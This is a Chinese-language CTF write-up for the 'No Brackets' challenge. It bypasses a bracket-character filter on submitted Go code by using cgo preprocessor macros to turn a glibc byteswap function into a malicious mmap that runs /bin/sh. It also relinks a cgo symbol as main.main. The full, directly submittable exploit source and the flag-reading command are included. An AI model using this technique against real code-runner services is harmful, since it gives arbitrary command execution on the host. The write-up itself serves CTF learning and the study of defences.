# No Brackets

## 题目简述

服务读取选手提交的 Go 源码，若出现任意字符：

```text
[](){}<>
```

就直接拒绝；否则在临时目录执行 `go run main.go`。常规 Go 函数、调用、复合类型和泛型几乎都需要括号，无法直接写出可运行的 `main`。

突破点是 cgo：`import "C"` 前面的块注释会被当作 C 预处理器输入，而 `#define`、字符串形式的 `#include` 和 `//go:linkname` 都不需要被禁止的字符。通过宏改写 glibc 内部头文件，可以导出一个恶意 `mmap` 符号；Go 运行时调用它时便执行 `/bin/sh`。

## 解题过程

### 用宏把字节交换函数改写成 mmap

可直接提交下面的源码：

```go
package main

/*
#define __bswap_16 ___aaaa
#define __bswap_32 ___bbbb
#define __bswap_64 ___cccc
#include "stdlib.h"
#undef __bswap_16
#undef __bswap_32
#undef __bswap_64
#define _BYTESWAP_H
#undef _BITS_BYTESWAP_H
#define _NETINET_IN_H
#define static
#define __inline
#define __bswap_16 mmap
#define __uint16_t char *
#define __builtin_bswap16 system
#define return __bsx = "/bin/sh";
#include "bits/byteswap.h"
#undef __builtin_bswap16
#undef static
#undef __inline
#undef __uint16_t
#undef return
*/
import "C"
import _ "unsafe"

//go:linkname _Cgo_ptr main.main
```

整份代码不含黑名单中的八个字符。

第一次包含 `stdlib.h` 前，先把 `__bswap_16/32/64` 临时改成无害名称，避免系统头文件中的定义冲突。随后取消这些宏，并取消 `bits/byteswap.h` 的 include guard；定义 `_NETINET_IN_H` 是为了绕过该内部头文件“禁止直接包含”的检查。

第二组宏把原函数：

```c
static inline uint16_t __bswap_16(uint16_t x) {
    return __builtin_bswap16(x);
}
```

在预处理后变成等价于：

```c
char *mmap(char *x) {
    x = "/bin/sh";
    system(x);
}
```

清空 `static` 与 `__inline` 使它成为真正导出的全局符号，而不是当前编译单元内的内联实现。

### 伪造 Go 入口并触发符号劫持

源码没有办法正常写出 `func main() {}`。导入 `C` 后，cgo 会生成固定的内部符号 `_Cgo_ptr`；再导入 `unsafe` 并使用：

```go
//go:linkname _Cgo_ptr main.main
```

就把该现成符号链接成 Go 所要求的 `main.main`，从而绕过链接器对入口函数的检查。

cgo 生成的 C 对象与 Go 可执行文件链接后，恶意 `mmap` 位于主程序自身的动态符号中。ELF 符号解析时，主程序定义优先于 libc 的同名实现；Go runtime 在初始化内存时调用 `mmap`，实际进入只有一个显式参数的恶意实现。x86-64 调用约定允许它忽略额外参数，函数随即执行：

```sh
/bin/sh
```

shell 继承当前标准输入输出。容器入口把 flag 移到 `/flag-<md5>.txt`，进入 shell 后执行：

```sh
cat /flag-*.txt
```

即可读取。

## 方法总结

本题的过滤发生在源码字符层，却把编译器、C 预处理器和链接器全部留在可信边界内。cgo 预处理宏负责合成没有括号的恶意函数，ELF 符号优先级负责把它注入 Go runtime，`go:linkname` 则补上不存在的 Go 入口。

这不是普通 Go 语法绕过，而是一次编译链与运行时边界逃逸，因此归入 Pwn。原始 payload 的逐宏展开可参照 [DummyKitty 的 cgo 符号劫持分析](https://dummykitty.github.io/posts/R3CTF-2025-no-brackets-CGO-%E7%AC%A6%E5%8F%B7%E5%8A%AB%E6%8C%81/)，正文已经保留可直接提交的完整源文件。
